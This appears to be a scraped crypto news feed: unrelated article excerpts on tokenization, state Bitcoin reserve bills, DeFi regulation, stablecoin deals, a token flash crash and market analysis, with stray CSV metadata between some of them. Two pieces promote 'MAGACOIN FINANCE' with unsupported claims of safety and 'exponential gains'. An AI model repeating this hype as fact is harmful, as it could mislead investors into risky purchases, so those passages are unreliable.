A State Street study published Thursday projects that by 2030, between 10% and 24% of institutional investments could be made through tokenized instruments. Private equity and private fixed income are viewed as the most likely early candidates for tokenization. These markets have long struggled with illiquidity and high operational costs, making them prime targets for digital instruments designed to boost efficiency and unlock liquidity. “The acceleration in adoption of emerging technologies is remarkable. Institutional investors are moving beyond experimentation, and digital assets are now a strategic lever for growth, efficiency, and innovation,” said Joerg Ambrosius, president of Investment Services at State Street. He added that tokenization, artificial intelligence and quantum computing are converging to reshape the future of finance, with early adopters leading the charge. Our 2025 global research on #digitalassets and emerging technologies reveals a decisive shift in adoption and strategic commitment among institutional investors toward #tokenization and blockchain-enabled transformation. Read more: https://t.co/hzk1f3dZ1O pic.twitter.com/tULwI2Ke88 — State Street (@StateStreet) October 9, 2025 Digital Assets Average 7% of Portfolios, Set to More Than Double in Three Years The research also shows that while tokenization is gaining traction, many investors believe other technologies will have an even greater impact on operations. More than half of respondents pointed to generative AI and quantum computing as more transformative than blockchain, though they see the technologies working in tandem. Currently, institutional portfolios hold an average of 7% in digital assets, according to the study. That figure is expected to rise to 16% within three years. The most common forms are digital cash, along with tokenized versions of listed equities and fixed income. On average, respondents hold 1% of their portfolios in each of these categories. Asset Managers Outpace Owners in Bitcoin, Ethereum and Tokenized Assets Asset managers reported higher exposure than asset owners across nearly every category. 14% of managers said they held 2% to 5% of portfolios in Bitcoin, compared with 7% of asset owners. A small share of managers also admitted to having at least 5% of assets in Ethereum, meme coins or NFTs, pointing to the broader range of risk appetite. Tokenization of real-world assets is another area where managers are ahead. They reported greater exposure to tokenized public assets, tokenized private assets and digital cash than asset owners. Even so, cryptocurrencies remain the biggest driver of returns within digital portfolios. 27% of respondents said Bitcoin is their strongest performer today. A quarter also expect it to remain the top performer in three years. Meanwhile, Ethereum ranked second. 21% cited it as their biggest return generator now, and 22% expect that trend to continue. By contrast, only 13% said tokenized public assets drive most of their digital returns. Just 10% pointed to private assets. These figures are expected to remain mostly unchanged over the next three years. State Street Finds Confidence Growing That Tokenization Trend Is Durable State Street’s study suggests that private assets could be the first major beneficiaries of tokenization. This would likely happen once infrastructure improves and investor confidence matures. Moreover, institutions broadly expect digital assets to become mainstream within a decade. This reflects growing acceptance that the shift is structural rather than cyclical. The findings add weight to the view that tokenization could transform capital markets. By digitizing ownership of assets such as real estate and private credit, institutions could cut settlement times, reduce costs, and expand access to investors who were previously excluded from private markets.

Meanwhile, in Massachusetts, a bill to establish a state-level Bitcoin reserve received little enthusiasm during its first hearing. Despite bipartisan advocacy and successful examples from states like Texas and Arizona, political divisions and regulatory hesitation are still slowing progress on state-driven digital asset reserve initiatives. Crypto Crime May Fuel State Reserves Governments around the world may already be sitting on tens of billions of dollars in potentially recoverable digital assets, according to new research from Chainalysis. The blockchain analytics firm’s latest report suggests that as the United States and other nations consider establishing national cryptocurrency reserves, seized or seizable on-chain assets could play a big role in shaping those strategies. Chainalysis estimates that crypto wallets linked to illicit activity collectively hold more than $75 billion worth of digital assets. Of that amount, around $15 billion is held directly by known illicit entities, while another $60 billion resides in wallets that are indirectly exposed to those addresses. Illicit entity balances & assets held on-chain (Source: Chainalysis ) The report also found that darknet market operators and vendors control more than $40 billion in cryptocurrencies. Approximately three-quarters of the total illicit value is held in Bitcoin, though stablecoins are becoming more common in illicit transactions. The findings arrive as the US government explores ways to build a Strategic Bitcoin Reserve and Digital Asset Stockpile under the Trump administration’s direction . These initiatives are designed to grow federal crypto holdings through budget-neutral methods like asset forfeiture, which could potentially align enforcement efforts with fiscal policy goals. Chainalysis co-founder and CEO Jonathan Levin told Bloomberg that the report’s findings “raise asset forfeiture potential to a completely different level,” as these discoveries could shift how governments see cryptocurrency in both regulatory and strategic contexts. Recent law enforcement actions prove that there is at least somewhat of a growing intersection between digital assets and national policy. Canadian authorities recently seized roughly $40 million in crypto from TradeOgre, a platform that was accused of operating without proper registration and enabling money laundering. The move sparked backlash from parts of the crypto community, who argued that regulators overstepped. Despite headlines about hacks and illicit markets, the share of criminal activity in the broader crypto economy is still minimal. Chainalysis found that only 0.14% of all blockchain transactions in 2024 were linked to illegal activity — far below the estimated 2%–5% of global GDP laundered through traditional financial channels. Lawmakers Cool on Bitcoin Bill Meanwhile, a bill proposing the creation of a Bitcoin strategic reserve in Massachusetts met a very muted response after its first legislative hearing in eight months. The proposal was introduced by state Senator Peter Durant, and it seeks to allow the state treasury to allocate up to 10% of the Commonwealth Stabilization Fund toward Bitcoin and other digital assets, while also adding any crypto seized by state authorities to the reserve. During a hearing of the Joint Committee on Revenue, Durant shared details about the bill’s structure and explained that it would act as a “prudent diversification tool” providing transparency, oversight, and risk management without imposing any immediate mandates. However, after his presentation, the committee offered no questions or comments, which leaves some uncertainty over the bill’s prospects. Senator Peter Durant The state’s legislature is currently dominated by Democrats. This means that Durant, a Republican, could face an uphill battle to gain traction for the proposal. Durant said that discussions with fellow lawmakers have been constructive and that he is still optimistic about educating legislators on Bitcoin’s potential benefits. The committee now has 60 days from the hearing date to either advance the measure or send it for further review, which suggests the next update could come by early December. Dennis Porter, CEO of the Satoshi Action Fund, also testified in support of the bill by framing it as part of a bipartisan movement across US states to establish Bitcoin and digital asset reserves. Porter described Massachusetts as uniquely positioned to lead due to its long history of financial innovation, and the state’s role in pioneering America’s first mutual fund. The Massachusetts proposal follows similar initiatives across the United States. States like Texas, Arizona, and New Hampshire already enacted laws to create digital asset reserves, while others — including Wyoming, South Dakota, North Dakota, Pennsylvania, and Montana — delayed or rejected such measures. Despite the mixed reactions, supporters believe the growing national attention to digital asset reserves, including federal initiatives under President Trump’s executive order, could eventually drive more states to follow suit.",News|Crypto,EN,0,0,CRYPTOCURRENCY|BTC|FIAT|REGULATION|BLOCKCHAIN,"{'name': 'Coinpaper', 'img': 'https://resources.cryptocompare.com/news/93/default.png', 'lang': 'EN'}",coinpaper,2025-10-10 05:30:00

The plan, introduced by several Democratic senators, includes measures that could see high-risk DeFi platforms placed on a “restricted list.” Critics, including Blockchain Association CEO Summer Mersinger, have warned that the plan could drive the sector out of the U.S. entirely. Mersinger commented, “The language as written is impossible to comply with and would drive responsible development overseas,” adding that the proposal would “effectively ban decentralized finance, wallet development, and other applications.” Chervinsky says the proposal clashes with the CLARITY Act According to Punchbowl News, Senate Democrats on the Banking Committee have already circulated a proposal to Republicans that would extend KYC obligations to crypto app frontends, such as non-custodial wallets, and roll back protections for developers. The six-page draft reportedly gives the Treasury Department and other regulators authority to determine when a person or organization has control or significant influence, as well as whether a protocol qualifies as decentralized. It would also define as intermediaries anyone who designs, deploys, or operates a front-end service for a DeFi protocol, or who materially benefits from one involved in financial activities. Crypto lawyer Jake Chervinsky has openly challenged the initiative, stating that it could both jeopardize the work on establishing a coherent framework and undermine the bipartisan efforts being made with the CLARITY Act . He commented , “Senate Democrats are trying to kill market structure. A group just sent a counter-proposal to the RFIA, and it is deeply unserious. These Senators claim to be pro-crypto, but what they propose is basically a crypto ban.” Moreover, he argued that the proposal looked like something SEC Chair Gary Gensler might have written, saying it was “so bad,” given that it came from supposed crypto allies. He added that the plan is deeply flawed, would label nearly everyone in crypto as an intermediary, and force front-end providers to conduct KYC checks — likely driving U.S. DeFi firms offshore. Gabriel Shapiro, founder of MetaLeX Labs, also pointed out that DeFi protocols would still face mid-level regulation even if they were deemed suffıciently decentralized, unless they prohibited U.S. users from directly entering them and had no recurring profit-making situation. Still, Chevinsky did acknowledge that the bill contains some good provisions, such as protection for software developers against unreasonable regulations and prosecution, which he said would help avoid a return to the era of Gary Gensler. Mazhar asked lawmakers to craft measures that support innovation instead Crypto players also voiced their concerns about the Democrats’ proposal. Zunera Mazhar, vice president of government and policy affairs at the Digital Chamber, criticized the measures as overly aggressive and counterproductive, warning they could drive innovation overseas without tackling the real issues. She suggested that legislators should focus their attention on the real causes of illegal activities, adopt a risk-based strategy, and incentivize innovation, adding that “Good policy doesn’t punish decentralization.” Mersinger also called the draft “disappointing,” saying it’s inconsistent with America’s long tradition of leading on innovation . She emphasized that any market structure framework must prioritize strong DeFi safeguards, calling on Congress to take the time to get it right. Additionally, she emphasized that the goal should be to establish clear standards that protect consumers without stifling innovation in the United States.

Insider sources, preferring anonymity, have confirmed that the discussions are ongoing, with Coinbase having the upper hand in acquiring BVNK. If finalized, the acquisition, estimated to cost between $1.5 billion and $2.5 billion, may mark the largest stablecoin-related deal to date. Chris Harmse, Jesse Hemson-Struthers, and Donald Jackson founded BVNK in 2021 to help businesses and financial institutions integrate stablecoins for cross-border transactions, treasury operations, and digital asset settlements. The firm raised $50 million in December 2024, bringing its valuation to $750 million, with backing from Haun Ventures, Tiger Global, Coinbase Ventures, Visa Ventures, and Citi Ventures. BVNK may become the largest stablecoin deal following Stripe’s acquisition Stablecoins have rapidly emerged as a key part of the blockchain payments ecosystem, offering near-instant settlement and reduced transaction costs compared to traditional rails like SWIFT or card networks. BVNK’s infrastructure enables institutions to issue, move, and redeem stablecoins efficiently, helping bridge the gap between fiat and digital finance. JUST IN: Coinbase & Mastercard are in advanced talks to acquire BVNK — a $1.5B–$2.5B deal that could become the largest stablecoin acquisition ever. 💵🌍 If finalized, it would supercharge USDC adoption and reshape cross-border payments under the new GENIUS Act framework. ⚡ pic.twitter.com/sqr1o0fH4M — Jessica Gonzales (@lil_disruptor) October 10, 2025 BVNK acquisition talks follow Stripe’s acquisition of Bridge for $1.1 billion early this year, marking a wave of consolidation in the sector. BVNK’s valuation, if the deal goes through, in the estimated valuation of $1.5 to $2.5 billion, would surpass the previous Stripe deal, marking a growth in investor confidence in stablecoin-based systems. Both Coinbase and Mastercard have been actively expanding their blockchain and payments strategies. Coinbase integrated USDC stablecoin transfers into its ecosystem to support global remittances and merchant payments. Mastercard, on the other hand, has been developing blockchain-powered settlement systems to complement its existing card network, such as the recent partnership with USDC to advance stablecoin issuance. Cryptopolitan covered the story , confirming that Mastercard partnered with USDC, allowing merchants in Europe, the Middle East, and Africa to settle payments in USDC and Euro Coin (EURC) directly on its network. According to Mastercard, the partnership will help reduce bottlenecks, shorten settlement times, and improve liquidity for businesses using digital assets. Raj Seshadri, Mastercard’s chief commercial payments officer, revealed during a July analyst call that the company views stablecoins as an additional layer of value transfer, rather than a replacement for traditional currencies. He added that most flows will begin and end in fiat. GENIUS Act spurs the growing interest in stablecoin markets The growing interest in stablecoin adoption is largely attributed to recent regulatory developments in the United States and Europe, including the GENEUS Act, which streamlined the governing rules for blockchain-based payment instruments in the U.S. The Passage of such policies has encouraged traditional financial institutions to explore stablecoin integrations at scale. Meanwhile, StablecoinX raised $530 million in new PIPE financing recently, accumulating its total commitments to $890 million as it prepares to merge with TLGY Acquisition Corp. According to Cryptopolitan , the merger will form StablecoinX Inc., which will oversee more than 3 billion ENA tokens and list on Nasdaq under the ticker USDE. The combined entity will serve as the treasury and validator for the Ethena ecosystem, which manages the USDe stablecoin, now valued at $14.65 billion in supply after only ten months since launch. The report highlighted several investors who participated in the funding round, including Brevan Howard, IMC Trading, and Haun Ventures. Marc Piano, director of Ethena Foundation, revealed that financing boosts liquidity and flexibility as Ethena develops USDtb, a fiat-backed stablecoin to be issued in partnership with Anchorage Digital Bank, following the GENIUS Act’s new regulatory clarity. According to DefiLlama , the current total stablecoin market cap has grown to $303.73 billion, with Tether USDT still leading in market share with $177.48 billion in market cap.

Do Not Get Left Behind,https://timestabloid.com/shib-will-go-parabolic-when-alt-season-begins-do-not-get-left-behind/,"A recent projection by JD’s Updates that Shiba Inu (SHIB) will move parabolically when the next altcoin cycle begins ties the token’s prospects tightly to market timing. That claim assumes a favorable rotation of capital into smaller-cap tokens, but it overlooks immediate, project-specific events that have materially affected investor confidence and short-term price dynamics. Among those events is a significant security breach on Shibarium’s bridge earlier this month, which introduced both direct financial loss and operational disruption to the Shiba Inu ecosystem . $SHIB will go parabolic when alt season begins. Do not get left behind. — JD’s Updates (@jds_updates) October 7, 2025 Timing-based optimism versus recent operational shocks JD’s Updates frames SHIB’s potential largely as contingent on the onset of an altcoin season, implying that participation ahead of that cycle is the decisive factor. That position does not engage with the consequences of the Shibarium bridge exploit, which saw millions of dollars’ worth of ETH, SHIB, and other tokens withdrawn and prompted a temporary shutdown of bridge operations. The exploit forced immediate security measures and a pause in normal activity on the Layer-2 network, creating an environment where timing alone may not be sufficient to guarantee a rapid, sustained rally. Community and Market Responses: Confidence, Tokenomics, and Refunds The post generated differing viewpoints. Ryan Hong dismissed the idea, stating SHIB lacks serious interest and would underperform. His view reflects a growing skepticism towards meme tokens without fresh catalysts. Raphael Turtle questioned the foundation of the prediction itself, asking if an alt season is even guaranteed. Current market conditions, with capital still concentrated in larger assets, have left the timing of such a cycle uncertain. Roman Molina raised the most practical issue—SHIB’s massive circulating supply. With trillions of tokens still in existence, he questioned how many zeros could realistically be erased without substantial burn mechanisms or structural changes. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 Roman Molina’s comment about the need to reduce SHIB’s trillions-in-supply remains pertinent because an exploit that undermines confidence can reduce effective demand even further. Without meaningful and verifiable progress on supply-reduction mechanisms, any parabolic move tied to an altcoin rotation may be limited or short-lived. Conditional Upside Requires More Than Timing JD’s Updates’ forecast highlights a plausible path for outsized returns driven by market rotation, yet recent operational events have added new constraints. The Shibarium exploit and its aftermath have introduced short-term financial and reputational costs that affect liquidity, investor sentiment, and the practical mechanics of on-chain participation. For SHIB to realize the kind of parabolic gains projected, an altcoin cycle would need to coincide with demonstrable progress on security, compensation for affected users, and credible steps to address supply, not timing alone.

The firm runs Hong Kong’s largest licensed crypto exchange, HashKey Exchange. The company is aiming to raise as much as $500 million, the report added. The sources disclosed that HashKey is still negotiating details, including valuation and the listing schedule, which are subject to adjustment. The move aligns with Hong Kong’s growing digital asset regulatory efforts and friendly stance towards the asset class. Besides, Hong Kong officially launched its licensing regime for stablecoin issuers in August. Last month, HashKey announced plans to launch Asia’s largest multi-currency digital asset treasury (DAT) ecosystem fund . It unveiled plans to raise more than $500 million in its first phase. Further, the company has quickly increased its global presence, securing conditional approval from Dubai’s VARA to operate in the Middle East, followed by regulatory greenlights in Bermuda and Ireland . Hong Kong Poised to Be Among Top Global IPO Markets – Here’s Why KPMG has recently predicted that the city will top global IPO rankings, as it counted almost 300 active IPO filings as of 30 September – the highest in its history. Last month, Digital Currency Group (DCG) revealed that it is mulling a Hong Kong IPO, targeting approximately $500 million. The flurry of IPOs represents a strategic bet on institutional crypto adoption, leveraging Hong Kong’s regulatory innovation and the 2025 token rally. “IPOs in emerging industries like AI and crypto continue to capture headlines, reflecting investors’ growing interest in forward-looking investments,” said Paul Lau, partner, head of capital markets and professional practice, KPMG China. HSK Token Surges 13% Following IPO Report Following the Bloomberg report on Friday, HashKey’s native token, HSK, surged 13% to $0.46, after falling to $0.41. The IPO report fueled speculation about growth and token utility. A successful IPO might increase HSK’s visibility among traditional investors and expand its use cases.

With over 19,000 new investors joining ahead of listing, this fast-rising altcoin is being called the next hidden gem. Traders are watching closely after the ASTER token’s 12,000% surge last month, wondering if MAGACOIN could be the next big name to watch. MAGACOIN FINANCE Gains Massive Attention Before Listing Interest in MAGACOIN FINANCE continues to rise as investors hunt for the best altcoin to buy this month. The coin’s adoption has soared, with thousands joining its ecosystem ahead of its public debut. If you missed the 12,000% rally of ASTER, MAGACOIN Finance might be your next chance. Priced under $0.0006, the altcoin has been compared to early-stage breakout tokens that later saw major upside after listing. Many traders now see it as a fresh Solana challenger and a real contender for big upside moves. Why MAGACOIN FINANCE: Rising adoption before listing Transparent and audited structure Early-stage pricing under $0.0006 Hype across Telegram and X Seen by traders as the top altcoin to buy ahead of listings Solana Attracts Institutional Demand but Faces New Competition Solana (SOL) has held investor attention this week after climbing from $218 to $229. This recovery followed new optimism around potential U.S. rate cuts in 2025. Traders are eyeing the $300 mark as a realistic target as network fees and DEX volumes continue to grow. Solana’s total value locked (TVL) rose 8% in 30 days, driven by rising deposits in Kamino, Drift, and Orca. The network’s transaction count now surpasses Ethereum and its Layer-2 chains combined. Meanwhile, decentralized exchange activity has surged, with Pump and Meteora leading 78% and 73% growth, respectively. However, some traders have started rotating into smaller projects that can deliver faster returns. Despite Solana ETFs seeing $706 million in inflows, others believe its size limits explosive growth. This has led some Solana holders to look at new altcoins like MAGACOIN Finance, which offers early entry pricing and adoption growth not seen in major-cap assets. Shiba Inu Traders Look for the Next Big Breakout Shiba Inu (SHIB) continues to move within a tight range, with analysts calling for a possible “discharge” soon. According to ForexDreamVantage, SHIB has traded between $0.00001080 and $0.00001760 for months. Traders believe a breakout above the top of this range could spark a new rally, especially if Bitcoin remains strong. Still, many SHIB holders admit that quick gains have been harder to find as the token grows larger. While community optimism stays high, attention is shifting to smaller-cap coins that mirror the early days of Shiba Inu’s success. MAGACOIN Finance now fits that narrative — low-priced, growing fast, and building excitement ahead of listing. MAGACOIN FINANCE Audit Clears Transparency Check MAGACOIN FINANCE has completed its HashEx audit and awaits CertiK verification, showing its commitment to full transparency and security. How Traders Are Positioning This Month Traders looking for the best crypto to buy this October are paying close attention to MAGACOIN FINANCE . With soaring adoption and growing investor interest, it stands out as a new option in a market filled with older, slower coins. Those who missed ASTER’s 12,000% rise may see this as a second chance.

Behind the effort is entrepreneur Bill Zanker, known for his long-standing partnership with President Donald Trump. His company plans to raise at least $200 million for a structured digital-asset treasury (DAT), which would purchase and hold TRUMP tokens directly from the market. Sources close to the project revealed that the final target could grow to as high as $1 billion, depending on investor demand. While the move has generated buzz among meme coin traders, the market’s attention is also shifting toward MAGACOIN FINANCE, a rising crypto project that analysts say could become a centerpiece of the next generational wealth transfer in digital assets. Investors see MAGACOIN FINANCE as a high-upside alternative, combining early-stage momentum with long-term ecosystem growth potential. Reviving the TRUMP Token The new treasury proposal follows months of declining trading volume and stalled development around the TRUMP token. Earlier attempts to boost the coin’s utility – including plans for a Trump-branded crypto wallet – were halted after internal disagreements with World Liberty Financial, another Trump-linked blockchain initiative. Despite those setbacks, the project has maintained a dedicated community thanks to its strong branding and ties to the MAGA movement. Around 35% of TRUMP’s total supply is currently circulating in the market, while roughly 800 million tokens remain under control of entities connected to Trump and his allies. Zanker’s team hopes the new treasury will act as a stabilizing force for the token, ensuring consistent demand and rebuilding investor confidence. If successful, the initiative could create one of the first politically themed digital-asset treasuries, setting an example for how brand-driven crypto projects can establish financial longevity. MAGACOIN FINANCE Leads the Next Wave of Growth As TRUMP seeks to reestablish its footing, MAGACOIN FINANCE continues to steal the spotlight among retail and institutional investors alike. The project has rapidly become one of the most talked-about altcoins of 2025, attracting attention for its strong fundamentals, strategic rollout, and fast-growing community. MAGACOIN FINANCE has positioned itself as one of the safest and most transparent new assets in the market. What’s capturing investor enthusiasm, however, is not just its security – it’s the scale of its early success. Analysts estimate that MAGACOIN FINANCE could deliver exponential gains once it lists on major exchanges, thanks to its expanding ecosystem and unmatched presale demand. The project’s roadmap focuses on long-term utility, cross-chain expansion, and real-world integration – features rarely seen in early-stage altcoins. Many investors view it as more than just another speculative token; rather, as a foundation for a broader decentralized economy that rewards early participation and supports future scalability. Experts argue that as crypto adoption accelerates and institutional inflows expand, MAGACOIN FINANCE could be at the forefront of the next generational wealth wave, similar to how early Bitcoin and Ethereum adopters benefited from first-mover advantages in their respective eras. Institutional Interest Grows The TRUMP token’s revival plan comes as institutional appetite for meme-based and politically branded assets begins to surface. In August, Canary Capital filed documentation for a potential TRUMP exchange-traded fund (ETF) – a landmark move that could bring the token into regulated investment portfolios for the first time. Earlier in the year, GD Culture Group (GDC) committed $300 million across TRUMP and Bitcoin, while TRON founder Justin Sun pledged an additional $100 million, calling TRUMP “the currency of the MAGA movement.” These high-profile endorsements have reinforced the coin’s relevance, even amid volatile price action. Market analysts believe that if the upcoming treasury succeeds, it could transform TRUMP from a niche meme coin into a more structured digital asset – one that blends political branding with institutional-grade backing. Looking Ahead: Political Crypto Meets Institutional Money The TRUMP treasury initiative underscores how deeply politics and crypto have intertwined. With President Trump’s renewed focus on digital assets and corporate treasuries now exploring politically aligned coins, the sector is entering new territory – where ideology, innovation, and investment merge. However, while the TRUMP token aims to rebuild credibility through structured buying, investors searching for the next major growth story are increasingly turning to MAGACOIN FINANCE. The project’s early momentum, transparent foundation, and clear vision for long-term expansion have made it a top-tier contender for 2025’s best-performing altcoin. Both developments – Trump’s treasury initiative and MAGACOIN FINANCE’s rapid ascent – signal that crypto’s next phase won’t just be about technology, but about how narratives and ecosystems drive real financial transformation.

The survey, conducted by McLaughlin & Associates for The Digital Chamber , reached 800 adults and captured opinions that could matter as campaigns shape their policy messages ahead of the 2026 midterms. Survey Finds Crypto Stance Important The headline number — 64% — stood out in initial coverage. Based on reports, the poll asked respondents whether a candidate’s position on digital assets would affect their vote, and most said it would. The sample included a broad mix of registered voters, but political affiliation skewed slightly. Reports show 38% of respondents identified with the Democratic Party, yet a larger share said Republicans were better placed to support crypto-friendly rules — 37% versus 24% for Democrats. NEW POLL: McLaughlin poll finds crypto voters are swing voters, and real policy actions can move their votes. Learn More: https://t.co/iYID8raKGg pic.twitter.com/JYC7YCDgRp — The Digital Chamber (@DigitalChamber) October 8, 2025 Who Answered And How The Questions Were Framed The poll size of 800 gives a snapshot, not a full picture. Reports have disclosed that the survey was paid for by a pro-Bitcoin advocacy group, which raises questions about how the sample was recruited and how questions were worded. The firm that carried out the polling is a long-standing outfit, but the raw data and margin of error have not been widely published. That lack of detail makes it harder to judge whether the results reflect a broader public shift or a more focused group of interested voters. What The Numbers Might Mean For Voters Some respondents who invest in or follow crypto told pollsters they want looser enforcement of recent rules and clearer, friendlier policy from elected officials. That view appears to push partisanship in unexpected ways: people registered as Democrats said they might back Republican candidates who promise lighter regulation.

According to market trackers, the token fell from about $0.0083 to $0.0000051 in roughly two minutes, wiping out almost all of its value at the low point. Related Reading: XRP Open Interest Nears $3B As CEO Sees $10B ETF Inflows Ahead Trade data shows a rebound afterward, with prices climbing back toward $0.00151, though that still left the token more than 80% lower for the day. Binance Token Sudden Crash Shows Market Fragility Based on reports, the bloodbath unfolded very quickly. Trading volume spiked as roughly 573,000 AB tokens changed hands during the volatility, which pushed the 24-hour volume past $5 million. Liquidity numbers were thin by comparison: the token’s liquidity pool was reported at about $2.17 million. That gap between volume and liquidity can make markets vulnerable when large orders hit. According to Binance market data, the Binance Alpha token AB plunged from $0.0083 to $0.0000051 within two minutes — a drop of about 99% — before rebounding to $0.00151, still down more than 80% on the day. pic.twitter.com/mH8Y98MzES — Wu Blockchain (@WuBlockchain) October 9, 2025 The Likely Culprit Observers pointed to concentrated ownership as a likely amplifier. Reports have disclosed that the top 10 wallets controlled more than 97% of the circulating supply, which is listed at about 81 billion AB tokens with a total supply around 98 billion. Where so much of a token sits in a few hands, a single large sell order can push the price through multiple levels with little resistance. On-chain reports showed two large sales around the event: one for 192 million AB and another for 500 million AB, moves that coincided with heavy downward pressure. Theories On What Triggered The Plunge Market watchers suggested a number of possible triggers. A big wallet dump, a market maker pulling liquidity, or algorithmic trading that amplified price swings were among the ideas floated. Because the token trades on several venues, including Bitget and Gate, contagion between platforms can happen fast. No official explanation has been released by Binance or the AB project team, and that lack of comment has left traders relying on public trades and exchange charts to piece the timeline together.

However, that bounce did not erase the hit to confidence. Many retail traders who were hit by the flash crash reported losses, and sentiment turned strongly negative in the short term.

52927953,https://timestabloid.com/?p=85904,1760076165,https://resources.cryptocompare.com/news/67/default.png,Analyst to XRP Holders: All Structures Are Still In Place,https://timestabloid.com/analyst-to-xrp-holders-all-structures-are-still-in-place/,"Market analyst Mr. Xoom recently shared an update on XRP’s technical position, suggesting that the asset continues to maintain its broader market structure despite recent fluctuations. His analysis, accompanied by a detailed TradingView chart, highlights the persistence of XRP’s sideways consolidation phase , which has dominated price action in recent months. According to his assessment, there is no cause for alarm among holders, as the underlying formation remains intact. The chart shared by Mr. Xoom displays XRP trading near $2.87, reflecting minimal deviation from recent averages. The chart shows that the price remains within a defined horizontal range, with visible resistance around the $3.00 to $3.20 zone and clear support between $2.70 and $2.75. A descending trendline extending from earlier highs suggests a gradual tightening of price movement as XRP tests both structural boundaries. I don't understand those who are getting scared, all structures are still in place and XRP is just moving sideways. pic.twitter.com/44jkq6ASzr — xoom (@Mr_Xoom) October 8, 2025 Technical Analysis and Market Context The key takeaway from Mr. Xoom’s post is the preservation of the overall market framework. Despite intermittent volatility, XRP continues to respect major support and resistance levels, implying that long-term holders are observing consistent technical behavior rather than breakdowns. The analysis suggests that the $2.70 region is acting as a crucial support base, preventing deeper declines, while repeated rejections near $3.00 indicate unresolved buying pressure above that level. In the broader context, this type of consolidation often precedes a decisive move, but Mr. Xoom’s view implies that current conditions remain stable rather than bearish. The downward sloping trendline from the July peak continues to serve as a dynamic resistance, constraining upward momentum. If XRP sustains its structural integrity near support levels, the likelihood of a breakout attempt later in the quarter could increase, provided overall market sentiment improves. Community Reactions and Diverging Opinions The post attracted mixed opinions from community members. Some traders echoed Mr. Xoom’s confidence in the existing market structure, while others expressed frustration over the prolonged consolidation. Commenter Mike Steinbrink noted that he was not fearful but rather impatient, emphasizing that long-term holders have maintained their positions for years and remain committed. We are on X, follow us to connect with us :- @TimesTabloid1 — TimesTabloid (@TimesTabloid1) June 15, 2025 Another observer, Brendan, took a more skeptical view, describing XRP’s trajectory as stagnant rather than stable. Skolman reinforced that perspective, stating that XRP’s sideways movement has been a long-standing characteristic, lasting for several years without substantial forward progress. These differing responses reflect the division between patient investors awaiting structural confirmation and traders seeking more immediate price action. Market Stability Amid Patience and Fatigue Mr. Xoom’s analysis offers a structured view of XRP’s ongoing consolidation, emphasizing technical consistency over short-term fluctuations. His position underscores that the market remains within expected parameters, and the established framework continues to guide XRP’s trajectory . While community sentiment ranges from patient optimism to evident fatigue, the technical picture, as outlined in his chart, supports the view that XRP is maintaining equilibrium between key support and resistance zones. At present, XRP’s ability to sustain the $2.70 support while testing resistance near $3.00 will determine whether this extended consolidation continues or transitions into a breakout phase.

This expiry event is a little larger than last week’s, but there is unlikely to be any impact on spot markets, which have been mostly sideways for the past few days. The US government remains in shutdown mode, and the greenback continues to weaken, but crypto markets have largely shrugged this off. Bitcoin Options Expiry This week’s batch of Bitcoin options contracts has a put/call ratio of 1.1, meaning that there are slightly more short contracts expiring than longs, as the bulls regain composure. Max pain is around $117,000, according to Coinglass. Open interest (OI), or the value or number of Bitcoin options contracts yet to expire, is highest at $140,000, which has reached $2.4 billion at this strike price on Deribit. There is also over $2 billion in OI at $120k, $125k, and $130k, but short sellers have targeted $110,000 as a popular strike price with $1.3 billion in OI. Total BTC options OI across all exchanges is around $60 billion, climbing back toward peak levels again, according to Coinglass. Options Expiry Alert Over $5.3B in crypto options are set to expire tomorrow. $BTC : $4.3B notional | Put/Call: 1.12 | Max Pain: $117K $ETH : $0.94B notional | Put/Call: 0.9 | Max Pain: $4,400 BTC traders are split between $110K puts and $120K calls, while ETH flows are more… pic.twitter.com/IgzyHTtBEv — Deribit (@DeribitOfficial) October 9, 2025 “In the options market, implied volatility has lifted, skew turned neutral, and call-heavy flows dominate,” reported Glassnode this week. “Momentum remains strong, but bullish positioning is becoming increasingly crowded,” it added. In addition to today’s batch of Bitcoin options, around 217,000 Ethereum contracts are also expiring, with a notional value of $940 million, max pain at $4,400, and a put/call ratio of 0.9. Total ETH options OI across all exchanges is around $16 billion. This brings Friday’s combined crypto options expiry notional value to around $5.3 billion. Crypto Market Outlook Crypto markets haven’t moved much over the past 24 hours, with total capitalization remaining at $4.23 trillion. Bitcoin hit an intraday high of $123,500 but pulled back again to trade around $121,000 during the Friday morning Asian session. The asset is 4% down from its all-time high and heading towards support at $120,000. Ether prices fell back below $4,300 briefly in late trading on Thursday but recovered to around $4,350 at the time of writing. The altcoins were predominantly in the red this Friday morning.

The bill, titled An Act Relative to a Bitcoin Strategic Reserve, was introduced by Republican State Senator Peter Durant and presented before the Massachusetts Joint Committee on Revenue on Tuesday. Massachusetts Bill Proposes Allocating Billions From State Reserve to Bitcoin The Massachusetts Joint Revenue Committee sets hearing on Bitcoin Strategic Reserve bill for Oct 7, examining crypto’s role in state asset strategy. #Bitcoin #Massachusetts https://t.co/yMIwJw9DUY — Cryptonews.com (@cryptonews) September 29, 2025 The measure seeks to authorize the state treasury to allocate up to 10% of the Commonwealth Stabilization Fund, a reserve worth billions, into Bitcoin and other digital assets. It would also allow Bitcoin and cryptocurrencies seized by state authorities to be added to a dedicated reserve. “This creates a prudent diversification tool, ensuring full transparency, oversight, and risk management without mandating any action,” Durant said during the session. However, after opening the floor for questions, the committee members remained silent, offering no responses or follow-up inquiries on the proposal. The quiet reception marked the bill’s first legislative activity since it was introduced in February 2025. The committee now has 60 days to either advance the legislation or refer it for additional review, indicating possible movement by early December. Durant said that he remains optimistic despite the lack of immediate engagement. “We’ve been having great conversations with our colleagues about the possibility of bringing Bitcoin to Massachusetts, and we’re working hard to move this forward alongside others who have filed similar legislation,” he said. “Lawmakers have been engaged and open during the process, and we’re focused on continuing to educate every stakeholder.” Dennis Porter, CEO of the Bitcoin advocacy group Satoshi Action Fund, also testified in support of the bill. Porter described Massachusetts as “a historic financial hub” well suited to lead state-level Bitcoin initiatives, noting that the state pioneered America’s first mutual fund and has long been central to U.S. financial innovation. He argued that the measure could be bipartisan in nature and pointed to other U.S. states that have already taken steps to create digital asset reserves. State Bitcoin Reserve Movement Falters as Massachusetts Adds to Growing List of Delays The Massachusetts hearing follows similar activity across the country, where a handful of states have explored or enacted Bitcoin reserve measures. Texas , Arizona , and New Hampshire have all passed legislation establishing state-level reserves, while proposals in Wyoming, Montana, Pennsylvania, and North Dakota have stalled or been rejected. As of October 2025, only three states have successfully created Bitcoin reserve frameworks. New Hampshire became the first in May, followed by Arizona and Texas, which approved a modest $10 million allocation earlier this year. Data from the Bitcoin Reserve Monitor shows that more than two dozen states introduced reserve-related 